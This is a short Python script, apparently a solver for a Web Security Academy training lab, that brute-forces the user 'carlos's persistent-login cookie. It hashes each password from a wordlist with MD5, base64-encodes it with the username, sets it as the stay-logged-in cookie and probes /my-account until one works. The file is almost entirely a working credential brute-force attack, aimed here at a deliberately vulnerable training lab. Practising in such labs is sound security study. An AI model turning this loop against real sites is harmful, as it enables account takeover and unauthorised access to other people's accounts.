from web_security_academy.core.utils import auth_lab_passwords
from web_security_academy.core.logger import logger, NoNewline
from base64 import b64encode
from hashlib import md5


def solve_lab(session):
    passwords = auth_lab_passwords()
    logger.info(
        "Brute-forcing Carlos's stay-logged-in cookie using the following formula:"
    )
    logger.info('Cookie = BASE64(username + ":" + MD5(password))')

    with NoNewline():
        for password in passwords:
            md5_hash = md5(password.encode())
            cookie = b64encode(f"carlos:{md5_hash.hexdigest()}".encode())
            session.cookies.set("stay-logged-in", cookie.decode())

            params = {"id": "carlos"}
            resp = session.get_path("/my-account", params=params, allow_redirects=False)

            if resp.status_code != 200:
                logger.info(f"{password} => Incorrect")
            else:
                logger.success(f"{password} => Correct!")
                break
        else:
            logger.failure("Unable to brute-force Carlos's stay-logged-in cookie")
